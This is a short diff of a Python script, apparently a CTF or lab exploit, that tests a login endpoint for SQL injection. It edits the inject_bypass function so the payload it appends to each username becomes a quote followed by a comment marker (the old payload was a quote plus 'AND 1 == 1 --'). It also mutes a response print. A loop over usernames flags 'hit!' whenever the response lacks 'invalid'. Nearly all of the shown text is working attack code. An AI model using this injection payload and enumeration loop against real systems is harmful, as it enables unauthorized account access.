@@ -12,7 +12,7 @@ def send_request(params, url):
 
 
 def inject_bypass(user):
-    return user + "\" AND 1 == 1 --"
+    return user + "\" --"
 
 
 usernames = {
@@ -57,7 +57,7 @@ for username in usernames:
     }
 
     response = send_request(params, url)
-    print(response)
+    # print(response)
     if(not("invalid" in response.decode('utf-8'))):
         print("\n")
         print("\thit!")
